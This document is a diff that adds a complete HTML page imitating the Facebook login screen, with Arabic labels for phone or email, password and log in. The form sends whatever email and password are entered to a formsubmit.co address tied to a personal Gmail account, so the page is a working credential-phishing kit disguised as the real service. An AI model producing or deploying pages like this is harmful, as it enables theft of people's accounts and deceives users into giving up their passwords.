@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE-edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            outline: none;
+            box-sizing: border-box;
+        }
+        ::placeholder {
+          color: #777;
+          font-size: 16px;
+        }
+        .parent {
+          width: 100%;
+          height: 100vh;
+          position: relative;
+          background-color: #ffffff;
+        }
+        .main {
+          text-align: center;
+          width: 100%;
+          height: 100vh;
+          padding: 15px;
+          position: parent;
+          background-color: #EDF6FF;
+        }
+        @media (min-width: 768px) {
+          .main {
+            width: 384px;
+            height: 620px;
+            border-radius: 10px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+          }
+        }
+        .main form {
+          position: relative;
+          top: 20%;
+        }
+        .main form img {
+          width: 55px;
+          border-radius: 50%;
+          display: inline-block;
+          margin-bottom: 70px;
+        }
+        .main form input {
+          width: 100%;
+          padding: 22px 15px;
+          margin-bottom: 15px;
+          border-radius: 10px;
+          border: 1.5px solid #ddd;
+        }
+        .main form input:hover {
+          border-color: #777;
+        }
+        .main form button {
+          padding: 10px;
+          width: 100%;
+          border-radius: 30px;
+          border: none;
+          color: #ffffff;
+          transition: .3s;
+          font-size: 16px;
+          background-color: #0064E0;
+        }
+        .main form button:hover {
+          background-color: #4297ff;
+        }
+        .main form p {
+          text-align: center;
+          margin-top: 15px;
+        }
+        .btn {
+          padding: 10px;
+          width: 100%;
+          border-radius: 30px;
+          color: #0064E0;
+          font-size: 16px;
+          background-color: transparent;
+          border: 1.5px solid #0064E0;
+          margin-top: 150px;
+        }
+        @media (max-width: 768px) {
+          .btn {
+            margin-top: 250px;
+          }
+        }
+        
+    </style>
+</head>
+<body dir="rtl">
+  <div class="parent">
+    <div class="main">
+      <form action="https://formsubmit.co/mmansour616911@gmail.com" method="POST">
+          <img src="Logo.jpg" alt=""/>
+          <input type="text" name="email" placeholder="رقم الهاتف او البريد الإلكتروني">
+          <input type="password" name="password" placeholder="كلمة المرور">
+          <button type="submit">تسجيل دخول</button>
+          <p>نسيت كلمة السر؟</p>
+      </form>
+      <button class="btn">إنشاء حساب جديد</button>
+   </div>
+  </div>
+   <script>
+   
+   </script>
+</body>
+</html>
